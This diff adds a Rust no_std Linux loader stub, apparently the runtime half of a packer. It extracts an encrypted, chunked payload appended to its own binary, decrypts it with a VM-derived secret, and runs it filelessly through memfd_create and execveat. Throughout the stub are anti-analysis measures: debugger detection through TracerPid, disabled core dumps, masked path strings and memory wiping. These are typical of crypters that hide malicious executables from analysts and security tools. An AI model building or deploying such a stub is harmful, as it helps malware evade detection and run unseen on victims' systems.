@@ -1,0 +1,869 @@
+
+// Stub Linux sem libc. O payload v4 é lido do próprio arquivo e executado via memfd.
+#![no_std]
+#![no_main]
+
+#[macro_use]
+extern crate alloc;
+
+use alloc::vec::Vec;
+use core::alloc::{GlobalAlloc, Layout};
+use core::ffi::c_void;
+use core::sync::atomic::{compiler_fence, Ordering};
+
+use aes::Aes256;
+use aes::cipher::{block_padding::NoPadding, BlockModeDecrypt, KeyIvInit};
+use cbc::Decryptor;
+use hkdf::Hkdf;
+use hmac::{Hmac, KeyInit, Mac};
+use sha2::Sha256;
+
+type HmacSha256 = Hmac<Sha256>;
+type Aes256CbcDec = Decryptor<Aes256>;
+
+mod exec_vm;
+
+// Material específico deste build.
+static VM_SEED: [u8; 32] = [@@VM_SEED@@];
+static SECRET_ENC: [u8; 32] = [@@SECRET_ENC@@];
+static SECRET_MASK: [u8; 32] = [@@SECRET_MASK@@];
+
+const MAGIC_COUNT: usize = @@MAGIC_COUNT@@;
+const MAGICS: [u64; @@MAGIC_COUNT@@] = [@@MAGIC_ARRAY@@];
+const FRAG_FOOTER_MAGIC: u64 = 0x@@FOOTER_MAGIC@@;
+
+const FRAG_LABEL: [u8; 16] = [@@FRAG_LABEL@@];
+const META_LABEL: [u8; 16] = [@@META_LABEL@@];
+
+// Strings usadas pelo loader permanecem mascaradas no binário.
+static PROC_STATUS_ENC: [u8; 18] = [@@PROC_STATUS_ENC@@];
+static PROC_STATUS_MASK: [u8; 18] = [@@PROC_STATUS_MASK@@];
+
+static PROC_SELF_EXE_ENC: [u8; 15] = [@@PROC_SELF_EXE_ENC@@];
+static PROC_SELF_EXE_MASK: [u8; 15] = [@@PROC_SELF_EXE_MASK@@];
+
+static TRACER_PID_ENC: [u8; 10] = [@@TRACER_PID_ENC@@];
+static TRACER_PID_MASK: [u8; 10] = [@@TRACER_PID_MASK@@];
+
+// Layout do PackedRegion v4 compartilhado com o packer.
+const FRAG_FORMAT_VERSION: u32 = 4;
+const FRAG_CHUNK_VERSION: u8 = 1;
+const BUILD_ID_SIZE: usize = 16;
+const SALT_SIZE: usize = 32;
+const IV_SIZE: usize = 16;
+const KEY_SIZE: usize = 32;
+const TAG_SIZE: usize = 32;
+const CHUNK_HEADER_SIZE: usize = 1 + 1 + 2 + 4 + BUILD_ID_SIZE + SALT_SIZE + IV_SIZE + 8 + 8;
+const DIR_ENTRY_SIZE: usize = 16;
+const FOOTER_SIZE: usize = 40;
+const TRAILER_SIZE: usize = 32;
+const MAX_PAYLOAD_SIZE: u64 = 512 * 1024 * 1024;
+
+
+// Conjunto mínimo de syscalls usado pelo runtime no_std.
+const SYS_READ: usize = 0;
+const SYS_WRITE: usize = 1;
+const SYS_OPEN: usize = 2;
+const SYS_CLOSE: usize = 3;
+const SYS_LSEEK: usize = 8;
+const SYS_MMAP: usize = 9;
+const SYS_MUNMAP: usize = 11;
+const SYS_PREAD64: usize = 17;
+const SYS_FCNTL: usize = 72;
+const SYS_MLOCK: usize = 149;
+const SYS_PRCTL: usize = 157;
+const SYS_EXIT_GROUP: usize = 231;
+const SYS_MEMFD_CREATE: usize = 319;
+const SYS_EXECVEAT: usize = 322;
+
+const O_RDONLY: usize = 0;
+const SEEK_END: usize = 2;
+const PROT_RW: usize = 3;
+const MAP_PRIVATE_ANON: usize = 0x22;
+const PR_SET_DUMPABLE: usize = 4;
+const MFD_CLOEXEC: usize = 1;
+const MFD_ALLOW_SEALING: usize = 2;
+const F_ADD_SEALS: usize = 1033;
+const F_SEAL_SHRINK: usize = 2;
+const F_SEAL_GROW: usize = 4;
+const F_SEAL_WRITE: usize = 8;
+const AT_EMPTY_PATH: usize = 0x1000;
+
+#[inline]
+unsafe fn syscall(
+    n: usize,
+    a1: usize,
+    a2: usize,
+    a3: usize,
+    a4: usize,
+    a5: usize,
+    a6: usize,
+) -> isize {
+    let ret: isize;
+    core::arch::asm!(
+        "syscall",
+        inlateout("rax") n => ret,
+        in("rdi") a1,
+        in("rsi") a2,
+        in("rdx") a3,
+        in("r10") a4,
+        in("r8") a5,
+        in("r9") a6,
+        out("rcx") _,
+        out("r11") _,
+        options(nostack),
+    );
+    ret
+}
+
+unsafe fn sys_open(path: *const u8, flags: usize) -> isize {
+    syscall(SYS_OPEN, path as usize, flags, 0, 0, 0, 0)
+}
+unsafe fn sys_close(fd: isize) -> isize {
+    syscall(SYS_CLOSE, fd as usize, 0, 0, 0, 0, 0)
+}
+unsafe fn sys_lseek(fd: isize, off: isize, whence: usize) -> isize {
+    syscall(SYS_LSEEK, fd as usize, off as usize, whence, 0, 0, 0)
+}
+unsafe fn sys_pread(fd: isize, buf: *mut u8, count: usize, off: usize) -> isize {
+    syscall(SYS_PREAD64, fd as usize, buf as usize, count, off, 0, 0)
+}
+unsafe fn sys_read(fd: isize, buf: *mut u8, count: usize) -> isize {
+    syscall(SYS_READ, fd as usize, buf as usize, count, 0, 0, 0)
+}
+unsafe fn sys_write(fd: isize, buf: *const u8, count: usize) -> isize {
+    syscall(SYS_WRITE, fd as usize, buf as usize, count, 0, 0, 0)
+}
+unsafe fn sys_mmap(len: usize) -> isize {
+    syscall(SYS_MMAP, 0, len, PROT_RW, MAP_PRIVATE_ANON, usize::MAX, 0)
+}
+unsafe fn sys_munmap(addr: *mut u8, len: usize) -> isize {
+    syscall(SYS_MUNMAP, addr as usize, len, 0, 0, 0, 0)
+}
+unsafe fn sys_prctl_dumpable_off() -> isize {
+    syscall(SYS_PRCTL, PR_SET_DUMPABLE, 0, 0, 0, 0, 0)
+}
+unsafe fn sys_mlock(addr: *const u8, len: usize) -> isize {
+    syscall(SYS_MLOCK, addr as usize, len, 0, 0, 0, 0)
+}
+unsafe fn sys_memfd_create(name: *const u8, flags: usize) -> isize {
+    syscall(SYS_MEMFD_CREATE, name as usize, flags, 0, 0, 0, 0)
+}
+unsafe fn sys_fcntl(fd: isize, cmd: usize, arg: usize) -> isize {
+    syscall(SYS_FCNTL, fd as usize, cmd, arg, 0, 0, 0)
+}
+unsafe fn sys_execveat(
+    fd: isize,
+    path: *const u8,
+    argv: *const *const u8,
+    envp: *const *const u8,
+    flags: usize,
+) -> isize {
+    syscall(
+        SYS_EXECVEAT,
+        fd as usize,
+        path as usize,
+        argv as usize,
+        envp as usize,
+        flags,
+        0,
+    )
+}
+fn sys_exit(code: usize) -> ! {
+    unsafe {
+        syscall(SYS_EXIT_GROUP, code, 0, 0, 0, 0, 0);
+    }
+    loop {}
+}
+
+
+// `_start` recebe a pilha inicial do kernel e repassa argc/argv/envp para Rust.
+core::arch::global_asm!(
+    ".text",
+    ".global _start",
+    "_start:",
+    "xor rbp, rbp",
+    "mov rdi, rsp",
+    "and rsp, -16",
+    "call rust_start",
+);
+
+#[unsafe(no_mangle)]
+unsafe extern "C" fn rust_start(sp: *const usize) -> ! {
+    let argc = *sp;
+    let argv = sp.add(1) as *const *const u8;
+    let envp = sp.add(argc + 2) as *const *const u8;
+    let _ = run(argv, envp);
+    sys_exit(1)
+}
+
+
+// Allocator mínimo baseado em mmap.
+struct SysAlloc;
+
+unsafe impl GlobalAlloc for SysAlloc {
+    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
+        const PAGE_SIZE: usize = 4096;
+        const HEADER_WORDS: usize = 2;
+        const HEADER_SIZE: usize = core::mem::size_of::<usize>() * HEADER_WORDS;
+
+        let align = core::cmp::max(
+            layout.align(),
+            core::mem::align_of::<usize>(),
+        );
+
+        let size = core::cmp::max(layout.size(), 1);
+
+        let needed = match HEADER_SIZE
+            .checked_add(align - 1)
+            .and_then(|v| v.checked_add(size))
+        {
+            Some(v) => v,
+            None => return core::ptr::null_mut(),
+        };
+
+        let total = match needed.checked_add(PAGE_SIZE - 1) {
+            Some(v) => v & !(PAGE_SIZE - 1),
+            None => return core::ptr::null_mut(),
+        };
+
+        let ret = unsafe { sys_mmap(total) };
+
+        if ret < 0 {
+            return core::ptr::null_mut();
+        }
+
+        let base = ret as *mut u8;
+        let base_addr = base as usize;
+
+        let min_data_addr = match base_addr.checked_add(HEADER_SIZE) {
+            Some(v) => v,
+            None => {
+                unsafe {
+                    sys_munmap(base, total);
+                }
+                return core::ptr::null_mut();
+            }
+        };
+
+        let aligned_addr = match min_data_addr.checked_add(align - 1) {
+            Some(v) => v & !(align - 1),
+            None => {
+                unsafe {
+                    sys_munmap(base, total);
+                }
+                return core::ptr::null_mut();
+            }
+        };
+
+        let aligned = aligned_addr as *mut u8;
+
+        // O header guarda base e tamanho do mmap para o dealloc.
+        let meta = unsafe {
+            aligned.sub(HEADER_SIZE) as *mut usize
+        };
+
+        unsafe {
+            core::ptr::write(meta, base_addr);
+            core::ptr::write(meta.add(1), total);
+        }
+
+        aligned
+    }
+
+    unsafe fn dealloc(&self, ptr: *mut u8, _layout: Layout) {
+        const HEADER_WORDS: usize = 2;
+        const HEADER_SIZE: usize = core::mem::size_of::<usize>() * HEADER_WORDS;
+
+        if ptr.is_null() {
+            return;
+        }
+
+        let meta = unsafe {
+            ptr.sub(HEADER_SIZE) as *const usize
+        };
+
+        let base_addr = unsafe {
+            core::ptr::read(meta)
+        };
+
+        let total = unsafe {
+            core::ptr::read(meta.add(1))
+        };
+
+        if base_addr == 0 || total == 0 {
+            return;
+        }
+
+        unsafe {
+            sys_munmap(base_addr as *mut u8, total);
+        }
+    }
+}
+
+
+#[global_allocator]
+static ALLOCATOR: SysAlloc = SysAlloc;
+
+#[panic_handler]
+fn panic(_info: &core::panic::PanicInfo) -> ! {
+    sys_exit(1)
+}
+
+// Símbolos esperados pelo codegen quando libc não está vinculada.
+#[unsafe(no_mangle)]
+pub unsafe extern "C" fn memcpy(dest: *mut c_void, src: *const c_void, n: usize) -> *mut c_void {
+    let d = dest as *mut u8;
+    let s = src as *const u8;
+    let mut i = 0;
+    while i < n {
+        core::ptr::write_volatile(d.add(i), core::ptr::read_volatile(s.add(i)));
+        i += 1;
+    }
+    dest
+}
+#[unsafe(no_mangle)]
+pub unsafe extern "C" fn memmove(dest: *mut c_void, src: *const c_void, n: usize) -> *mut c_void {
+    let d = dest as *mut u8;
+    let s = src as *const u8;
+    if (d as usize) < (s as usize) {
+        let mut i = 0;
+        while i < n {
+            core::ptr::write_volatile(d.add(i), core::ptr::read_volatile(s.add(i)));
+            i += 1;
+        }
+    } else {
+        let mut i = n;
+        while i > 0 {
+            i -= 1;
+            core::ptr::write_volatile(d.add(i), core::ptr::read_volatile(s.add(i)));
+        }
+    }
+    dest
+}
+#[unsafe(no_mangle)]
+pub unsafe extern "C" fn memset(dest: *mut c_void, c: i32, n: usize) -> *mut c_void {
+    let d = dest as *mut u8;
+    let b = c as u8;
+    let mut i = 0;
+    while i < n {
+        core::ptr::write_volatile(d.add(i), b);
+        i += 1;
+    }
+    dest
+}
+#[unsafe(no_mangle)]
+pub unsafe extern "C" fn memcmp(a: *const c_void, b: *const c_void, n: usize) -> i32 {
+    let pa = a as *const u8;
+    let pb = b as *const u8;
+    let mut i = 0;
+    while i < n {
+        let x = core::ptr::read_volatile(pa.add(i));
+        let y = core::ptr::read_volatile(pb.add(i));
+        if x != y {
+            return x as i32 - y as i32;
+        }
+        i += 1;
+    }
+    0
+}
+#[unsafe(no_mangle)]
+pub unsafe extern "C" fn bcmp(a: *const c_void, b: *const c_void, n: usize) -> i32 {
+    memcmp(a, b, n)
+}
+
+
+fn hmac_sha256(key: &[u8], data: &[u8]) -> [u8; 32] {
+    let mut mac = match HmacSha256::new_from_slice(key) {
+        Ok(m) => m,
+        Err(_) => sys_exit(1),
+    };
+    mac.update(data);
+    let out = mac.finalize().into_bytes();
+    let mut r = [0u8; 32];
+    r.copy_from_slice(&out);
+    r
+}
+
+// Verifica duas partes sem montar um buffer intermediário.
+fn hmac_sha256_verify2(key: &[u8], a: &[u8], b: &[u8], tag: &[u8]) -> bool {
+    let mut mac = match HmacSha256::new_from_slice(key) {
+        Ok(m) => m,
+        Err(_) => return false,
+    };
+    mac.update(a);
+    mac.update(b);
+    mac.verify_slice(tag).is_ok()
+}
+
+// Limpeza best-effort; volatile + fence evitam remoção pelo otimizador.
+#[inline(never)]
+fn secure_zero(data: &mut [u8]) {
+    for b in data {
+        unsafe { core::ptr::write_volatile(b, 0) };
+    }
+
+    compiler_fence(Ordering::SeqCst);
+}
+
+// Reconstrói dados mascarados apenas quando necessários.
+#[inline(never)]
+fn decode_masked(encoded: &[u8], mask: &[u8], out: &mut [u8]) -> bool {
+    if encoded.len() != mask.len() || out.len() != encoded.len() {
+        return false;
+    }
+
+    let mut i = 0usize;
+    while i < encoded.len() {
+        unsafe {
+            let e = core::ptr::read_volatile(encoded.as_ptr().add(i));
+            let m = core::ptr::read_volatile(mask.as_ptr().add(i));
+            core::ptr::write_volatile(out.as_mut_ptr().add(i), e ^ m);
+        }
+        i += 1;
+    }
+    true
+}
+
+fn hkdf_sha256(ikm: &[u8], salt: &[u8], info: &[u8], okm: &mut [u8]) -> bool {
+    let hk = Hkdf::<Sha256>::new(Some(salt), ikm);
+    hk.expand(info, okm).is_ok()
+}
+
+fn derive_meta_key(secret: &[u8]) -> [u8; 32] {
+    hmac_sha256(secret, &META_LABEL)
+}
+
+fn make_chunk_info(build_id: &[u8], magic: u64, index: u32) -> Vec<u8> {
+    let mut v = Vec::with_capacity(16 + BUILD_ID_SIZE + 8 + 4);
+    v.extend_from_slice(&FRAG_LABEL);
+    v.extend_from_slice(build_id);
+    v.extend_from_slice(&magic.to_le_bytes());
+    v.extend_from_slice(&index.to_le_bytes());
+    v
+}
+
+fn aes_cbc_decrypt(key: &[u8], iv: &[u8], data: &[u8]) -> Option<Vec<u8>> {
+    if data.is_empty() || data.len() % IV_SIZE != 0 {
+        return None;
+    }
+    let mut buf = data.to_vec();
+    let dec = Aes256CbcDec::new_from_slices(key, iv).ok()?;
+    let n = dec.decrypt_padded::<NoPadding>(&mut buf).ok()?.len();
+    buf.truncate(n);
+    Some(buf)
+}
+
+fn pkcs7_unpad_len(data: &[u8]) -> Option<usize> {
+    let n = data.len();
+    if n == 0 || n % IV_SIZE != 0 {
+        return None;
+    }
+    let pad = data[n - 1] as usize;
+    if pad < 1 || pad > IV_SIZE || pad > n {
+        return None;
+    }
+    let mut diff: u8 = 0;
+    let mut j = 1;
+    while j <= IV_SIZE {
+        if j <= pad {
+            diff |= data[n - j] ^ (pad as u8);
+        }
+        j += 1;
+    }
+    if diff != 0 {
+        return None;
+    }
+    let unp = n - pad;
+    if unp == 0 {
+        None
+    } else {
+        Some(unp)
+    }
+}
+
+// Implementação escolhida pelo packer.
+@@DECOMPRESSOR_IMPL@@
+
+fn is_elf64_x86_64(d: &[u8]) -> bool {
+    d.len() >= 20
+        && d[0] == 0x7F
+        && d[1] == b'E'
+        && d[2] == b'L'
+        && d[3] == b'F'
+        && d[4] == 2
+        && d[18] == 0x3E
+        && d[19] == 0x00
+}
+
+#[inline]
+fn get_u64(b: &[u8], o: usize) -> u64 {
+    let mut a = [0u8; 8];
+    a.copy_from_slice(&b[o..o + 8]);
+    u64::from_le_bytes(a)
+}
+
+#[inline]
+fn get_u32(b: &[u8], o: usize) -> u32 {
+    let mut a = [0u8; 4];
+    a.copy_from_slice(&b[o..o + 4]);
+    u32::from_le_bytes(a)
+}
+
+
+// Leitura posicional mantém o parser independente do cursor do arquivo.
+fn read_at(fd: isize, off: u64, len: usize) -> Option<Vec<u8>> {
+    let mut buf = vec![0u8; len];
+    let mut done = 0usize;
+    while done < len {
+        let r = unsafe {
+            sys_pread(
+                fd,
+                buf[done..].as_mut_ptr(),
+                len - done,
+                (off + done as u64) as usize,
+            )
+        };
+        if r <= 0 {
+            return None;
+        }
+        done += r as usize;
+    }
+    Some(buf)
+}
+
+// Lê TracerPid de /proc/self/status.
+fn tracer_pid() -> i64 {
+    let mut status_path = [0u8; 18];
+    if !decode_masked(&PROC_STATUS_ENC, &PROC_STATUS_MASK, &mut status_path) {
+        return 0;
+    }
+
+    let fd = unsafe { sys_open(status_path.as_ptr(), O_RDONLY) };
+    secure_zero(&mut status_path);
+
+    if fd < 0 {
+        return 0;
+    }
+
+    let mut buf = [0u8; 8192];
+    let mut total = 0usize;
+    while total < buf.len() {
+        let r = unsafe { sys_read(fd, buf[total..].as_mut_ptr(), buf.len() - total) };
+        if r <= 0 {
+            break;
+        }
+        total += r as usize;
+    }
+    unsafe { sys_close(fd) };
+
+    let mut pat = [0u8; 10];
+    if !decode_masked(&TRACER_PID_ENC, &TRACER_PID_MASK, &mut pat) {
+        return 0;
+    }
+
+    let data = &buf[..total];
+    let mut result = 0i64;
+    let mut i = 0usize;
+
+    while i + pat.len() <= data.len() {
+        if &data[i..i + pat.len()] == &pat[..] {
+            let mut j = i + pat.len();
+            while j < data.len() && (data[j] == b' ' || data[j] == b'\t') {
+                j += 1;
+            }
+
+            let mut val: i64 = 0;
+            let mut any = false;
+            while j < data.len() && data[j].is_ascii_digit() {
+                val = val * 10 + (data[j] - b'0') as i64;
+                any = true;
+                j += 1;
+            }
+
+            if any {
+                result = val;
+            }
+            break;
+        }
+        i += 1;
+    }
+
+    secure_zero(&mut pat);
+    result
+}
+
+
+fn run(argv: *const *const u8, envp: *const *const u8) -> Option<()> {
+    if unsafe { sys_prctl_dumpable_off() } != 0 {
+        return None;
+    }
+    if tracer_pid() != 0 {
+        return None;
+    }
+
+    let mut self_path = [0u8; 15];
+    if !decode_masked(&PROC_SELF_EXE_ENC, &PROC_SELF_EXE_MASK, &mut self_path) {
+        return None;
+    }
+
+    let fd = unsafe { sys_open(self_path.as_ptr(), O_RDONLY) };
+    secure_zero(&mut self_path);
+
+    if fd < 0 {
+        return None;
+    }
+
+    let sz = unsafe { sys_lseek(fd, 0, SEEK_END) };
+    if sz < 0 {
+        unsafe { sys_close(fd) };
+        return None;
+    }
+    let fsize = sz as u64;
+    if (fsize as usize) < FOOTER_SIZE + TRAILER_SIZE {
+        unsafe { sys_close(fd) };
+        return None;
+    }
+
+    // Footer e trailer ficam no fim do stub.
+    let trailer = read_at(fd, fsize - TRAILER_SIZE as u64, TRAILER_SIZE)?;
+    let footer = read_at(fd, fsize - TRAILER_SIZE as u64 - FOOTER_SIZE as u64, FOOTER_SIZE)?;
+
+    if get_u64(&footer, 0) != FRAG_FOOTER_MAGIC
+        || get_u32(&footer, 8) != FRAG_FORMAT_VERSION
+    {
+        unsafe { sys_close(fd) };
+        return None;
+    }
+    let n = get_u32(&footer, 12) as usize;
+    if n != MAGIC_COUNT || n < 1 {
+        unsafe { sys_close(fd) };
+        return None;
+    }
+    let dir_size = get_u64(&footer, 16);
+    let packed_size = get_u64(&footer, 24);
+    let final_size = get_u64(&footer, 32);
+
+    if dir_size != (n as u64) * DIR_ENTRY_SIZE as u64
+        || packed_size == 0
+        || packed_size > fsize
+        || packed_size < dir_size + FOOTER_SIZE as u64 + TRAILER_SIZE as u64
+        || final_size == 0
+        || final_size > MAX_PAYLOAD_SIZE
+    {
+        unsafe { sys_close(fd) };
+        return None;
+    }
+
+    let start_offset = fsize - packed_size;
+    let chunk_region_size = packed_size - dir_size - FOOTER_SIZE as u64 - TRAILER_SIZE as u64;
+
+    let dir_pos = fsize - TRAILER_SIZE as u64 - FOOTER_SIZE as u64 - dir_size;
+    let dir = read_at(fd, dir_pos, dir_size as usize)?;
+
+    // O Secret depende do programa de mistura gerado para este build.
+    let mut vm_mix = [0u8; 32];
+
+    if exec_vm::derive_mix(&VM_SEED, &mut vm_mix).is_err() {
+        unsafe { sys_close(fd) };
+        return None;
+    }
+
+    let mut secret = [0u8; 32];
+
+    if exec_vm::decode_secret(
+        &SECRET_ENC,
+        &SECRET_MASK,
+        &vm_mix,
+        &mut secret,
+    ).is_err() {
+        secure_zero(&mut vm_mix);
+        unsafe { sys_close(fd) };
+        return None;
+    }
+
+    secure_zero(&mut vm_mix);
+
+    // Metadados são autenticados antes da leitura dos chunks.
+    let mut meta_key = derive_meta_key(&secret);
+    let trailer_ok = hmac_sha256_verify2(&meta_key, &dir, &footer, &trailer);
+    secure_zero(&mut meta_key);
+    if !trailer_ok {
+        secure_zero(&mut secret);
+        unsafe { sys_close(fd) };
+        return None;
+    }
+
+    let mut state: [u8; 32] = secret;
+    secure_zero(&mut secret);
+
+    let mut compressed: Vec<u8> = Vec::new();
+    let mut i = 0usize;
+    while i < n {
+        let ch_off = get_u64(&dir, i * DIR_ENTRY_SIZE);
+        let ch_size = get_u64(&dir, i * DIR_ENTRY_SIZE + 8);
+
+        if ch_size < (CHUNK_HEADER_SIZE + TAG_SIZE + IV_SIZE) as u64
+            || ch_off > chunk_region_size
+            || ch_off + ch_size > chunk_region_size
+        {
+            unsafe { sys_close(fd) };
+            return None;
+        }
+
+        let chunk = read_at(fd, start_offset + ch_off, ch_size as usize)?;
+
+        if chunk[0] != FRAG_CHUNK_VERSION || get_u32(&chunk, 4) as usize != i {
+            unsafe { sys_close(fd) };
+            return None;
+        }
+
+        let build_id = &chunk[8..8 + BUILD_ID_SIZE];
+        let salt = &chunk[8 + BUILD_ID_SIZE..8 + BUILD_ID_SIZE + SALT_SIZE];
+        let iv = &chunk[8 + BUILD_ID_SIZE + SALT_SIZE..8 + BUILD_ID_SIZE + SALT_SIZE + IV_SIZE];
+        let cipher_len = get_u64(&chunk, 72);
+        let plain_len = get_u64(&chunk, 80);
+
+        if cipher_len == 0
+            || cipher_len % IV_SIZE as u64 != 0
+            || CHUNK_HEADER_SIZE as u64 + cipher_len + TAG_SIZE as u64 != ch_size
+            || plain_len == 0
+            || plain_len > cipher_len
+        {
+            unsafe { sys_close(fd) };
+            return None;
+        }
+
+        let cl = cipher_len as usize;
+        let header = &chunk[0..CHUNK_HEADER_SIZE];
+        let ct = &chunk[CHUNK_HEADER_SIZE..CHUNK_HEADER_SIZE + cl];
+        let tag = &chunk[CHUNK_HEADER_SIZE + cl..CHUNK_HEADER_SIZE + cl + TAG_SIZE];
+
+        let info = make_chunk_info(build_id, MAGICS[i], i as u32);
+        let mut okm = [0u8; KEY_SIZE * 2];
+        if !hkdf_sha256(&state, salt, &info, &mut okm) {
+            secure_zero(&mut okm);
+            unsafe { sys_close(fd) };
+            return None;
+        }
+
+        // Autentica Header || CipherText antes de descriptografar.
+        let tag_ok = hmac_sha256_verify2(
+            &okm[KEY_SIZE..KEY_SIZE * 2],
+            header,
+            ct,
+            tag,
+        );
+        if !tag_ok {
+            secure_zero(&mut okm);
+            unsafe { sys_close(fd) };
+            return None;
+        }
+
+        let mut padded = match aes_cbc_decrypt(&okm[0..KEY_SIZE], iv, ct) {
+            Some(v) => v,
+            None => {
+                secure_zero(&mut okm);
+                unsafe { sys_close(fd) };
+                return None;
+            }
+        };
+
+        secure_zero(&mut okm);
+
+        let unp = match pkcs7_unpad_len(&padded) {
+            Some(v) => v,
+            None => {
+                secure_zero(&mut padded);
+                unsafe { sys_close(fd) };
+                return None;
+            }
+        };
+        if unp as u64 != plain_len {
+            secure_zero(&mut padded);
+            unsafe { sys_close(fd) };
+            return None;
+        }
+
+        let plain = &padded[..unp];
+        compressed.extend_from_slice(plain);
+        state = hmac_sha256(&state, plain);
+
+        secure_zero(&mut padded);
+
+        i += 1;
+    }
+
+    unsafe { sys_close(fd) };
+
+    secure_zero(&mut state);
+
+    let payload_result = decompress_payload(&compressed, final_size as usize);
+    secure_zero(&mut compressed);
+    let mut payload = payload_result?;
+
+    if !is_elf64_x86_64(&payload) {
+        secure_zero(&mut payload);
+        return None;
+    }
+
+    unsafe { sys_mlock(payload.as_ptr(), payload.len()) };
+
+    // O ELF é copiado para um memfd e a cópia da heap é descartada em seguida.
+    let empty = [0u8; 1];
+    let mfd = unsafe { sys_memfd_create(empty.as_ptr(), MFD_CLOEXEC | MFD_ALLOW_SEALING) };
+    if mfd < 0 {
+        secure_zero(&mut payload);
+        return None;
+    }
+
+    let mut off = 0usize;
+    while off < payload.len() {
+        let w = unsafe { sys_write(mfd, payload[off..].as_ptr(), payload.len() - off) };
+        if w <= 0 {
+            secure_zero(&mut payload);
+            // Retorno aqui significa falha no gate ou no execveat.
+    unsafe { sys_close(mfd) };
+            return None;
+        }
+        off += w as usize;
+    }
+
+    secure_zero(&mut payload);
+
+    let seals = F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE;
+    if unsafe { sys_fcntl(mfd, F_ADD_SEALS, seals) } < 0 {
+        unsafe { sys_close(mfd) };
+        return None;
+    }
+
+    if tracer_pid() != 0 {
+        unsafe { sys_close(mfd) };
+        return None;
+    }
+
+    // O gate final libera somente a transição para execveat.
+    let vm_gate_token =
+        get_u64(&trailer, 0)
+        ^ get_u64(&trailer, 8).rotate_left(17)
+        ^ packed_size.rotate_left(7)
+        ^ final_size;
+
+    let vm_exec_result = exec_vm::execute(vm_gate_token, || unsafe {
+        sys_execveat(
+            mfd,
+            empty.as_ptr(),
+            argv,
+            envp,
+            AT_EMPTY_PATH,
+        )
+    });
+
+    unsafe { sys_close(mfd) };
+
+    if vm_exec_result.is_err() {
+        return None;
+    }
+
+    None
+}
